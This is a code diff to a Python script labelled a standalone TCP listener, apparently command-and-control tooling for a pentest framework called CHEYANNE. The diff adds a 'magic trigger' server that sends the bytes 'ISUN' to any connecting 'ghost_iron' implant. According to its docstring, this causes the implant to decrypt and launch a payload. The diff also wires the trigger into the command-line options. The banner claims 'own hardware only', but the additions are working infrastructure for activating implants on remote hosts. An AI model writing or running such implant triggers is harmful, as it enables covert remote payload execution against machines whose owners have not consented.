@@ -57,9 +57,11 @@ LOG_FILE = os.path.join(ROOT, "PENTEST_LOG.md")
 DL_DIR   = os.path.join(ROOT, "downloads")
 os.makedirs(DL_DIR, exist_ok=True)
 
-LISTEN_HOST = "0.0.0.0"
-LISTEN_PORT = 4443
-BANNER      = f"{GRN}{BOLD}CHEYANNE LISTENER{RST} {DIM}// 22DIV // own hardware only{RST}"
+LISTEN_HOST  = "0.0.0.0"
+LISTEN_PORT  = 4443
+MAGIC_PORT   = 4445    # ghost_iron ISUN auth port (standalone trigger listener)
+MAGIC_BYTES  = b"\x49\x53\x55\x4E"  # "ISUN"
+BANNER       = f"{GRN}{BOLD}CHEYANNE LISTENER{RST} {DIM}// 22DIV // own hardware only{RST}"
 PROMPT      = f"{GRN}chey>{RST} "
 
 # ── session registry ─────────────────────────────────────────────────────────
@@ -480,12 +482,46 @@ def cmd_loop():
             print(f"  {DIM}Unknown command: {cmd}. Type help.{RST}")
 
 
+# ── ghost_iron ISUN magic trigger ────────────────────────────────────────────
+def magic_trigger_loop(host: str = "0.0.0.0", port: int = MAGIC_PORT):
+    """
+    Listens on port for ghost_iron connections.
+    Sends ISUN (4 bytes) immediately on accept -- triggers payload decrypt+launch.
+    Run alongside main listener: python listener.py --magic
+    """
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    try:
+        srv.bind((host, port))
+    except OSError as e:
+        print(f"  {RED}[!] MAGIC port bind failed ({port}): {e}{RST}")
+        return
+    srv.listen(5)
+    print(f"  {CYN}[*] GHOST IRON magic trigger on {host}:{port}  (sends ISUN on connect){RST}")
+    log_event(f"MAGIC TRIGGER started on {host}:{port}")
+    while True:
+        try:
+            conn, addr = srv.accept()
+        except OSError:
+            break
+        try:
+            conn.sendall(MAGIC_BYTES)
+            conn.close()
+            print(f"  {GRN}[+] ISUN sent to {addr[0]}:{addr[1]}  -- ghost_iron should fire{RST}")
+            log_event(f"ISUN SENT to {addr[0]}:{addr[1]}")
+        except Exception as e:
+            print(f"  {RED}[!] MAGIC send failed: {e}{RST}")
+
+
 # ── entry ────────────────────────────────────────────────────────────────────
 def main():
     import argparse
     parser = argparse.ArgumentParser(description="CHEYANNE Standalone TCP Listener")
     parser.add_argument("--host", default=LISTEN_HOST)
     parser.add_argument("--port", type=int, default=LISTEN_PORT)
+    parser.add_argument("--magic", action="store_true",
+                        help=f"Also start ghost_iron ISUN trigger on port {MAGIC_PORT}")
+    parser.add_argument("--magic-port", type=int, default=MAGIC_PORT, dest="magic_port")
     args = parser.parse_args()
 
     srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -506,6 +542,11 @@ def main():
 
     log_event(f"LISTENER STARTED on {args.host}:{args.port}")
     threading.Thread(target=accept_loop, args=(srv,), daemon=True).start()
+
+    if args.magic:
+        threading.Thread(target=magic_trigger_loop,
+                         args=(args.host, args.magic_port), daemon=True).start()
+
     cmd_loop()
     srv.close()
 
